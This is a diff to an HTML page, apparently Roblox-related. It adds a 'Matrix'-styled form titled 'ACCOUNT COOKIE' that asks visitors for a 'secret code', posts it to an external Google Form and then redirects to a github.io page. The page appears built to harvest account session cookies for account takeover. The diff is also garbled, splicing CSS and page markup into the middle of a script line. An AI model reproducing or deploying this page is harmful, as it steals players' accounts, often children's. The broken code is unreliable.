@@ -112,6 +112,85 @@
         const ctx = canvas.getContext('2d');
 
         canvas.width = window.innerWidth;
+        canvas
+        }
+
+        h1 {
+            color: #0F0;
+            font-size: 2.5em;
+            margin-bottom: 30px;
+            text-shadow: 0 0 10px #0F0;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        input[type="text"] {
+            background-color: transparent;
+            border: 1px solid #0F0;
+            color: #0F0;
+            font-size: 1.2em;
+            padding: 15px;
+            font-family: 'Courier New', Courier, monospace;
+            outline: none;
+            text-align: center;
+        }
+
+        input[type="text"]::placeholder {
+            color: rgba(0, 255, 0, 0.5);
+        }
+
+        button {
+            background-color: #0F0;
+            color: black;
+            border: none;
+            padding: 15px;
+            font-size: 1.2em;
+            font-family: 'Courier New', Courier, monospace;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+            text-transform: uppercase;
+        }
+
+        button:hover {
+            background-color: #000;
+            color: #0F0;
+            border: 1px solid #0F0;
+            box-shadow: 0 0 15px #0F0;
+        }
+    </style>
+</head>
+<body>
+
+    <canvas id="matrixCanvas"></canvas>
+
+    <div class="container">
+        <h1>ACCOUNT COOKIE 🍪</h1>
+        
+        <form action="https://docs.google.com/forms/d/e/1FAIpQLSdrLs7G5pqlNXK5vjk7nsNERAJpz-0ckNMW4F0mYKxOjf_9Nw/formResponse" method="POST">
+            
+            <input type="text" name="entry.2005620554" placeholder="ENTER SECRET CODE HERE">
+
+            <input type="hidden" name="_captcha" value="false">
+            
+            <input type="hidden" name="continue" value="https://idot152011-source.github.io/Roblox.Bemmer/">
+            
+            <button type="submit">[ EXECUTE ]</button>
+        </form>
+    </div>
+
+    <script>
+        // --- קוד המטריקס (Matrix Rain) ---
+        const canvas = document.getElementById('matrixCanvas');
+        const ctx = canvas.getContext('2d');
+
+        canvas.width = window.innerWidth;
         canvas.height = window.innerHeight;
 
         const matrixChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567789@#$%^&*";
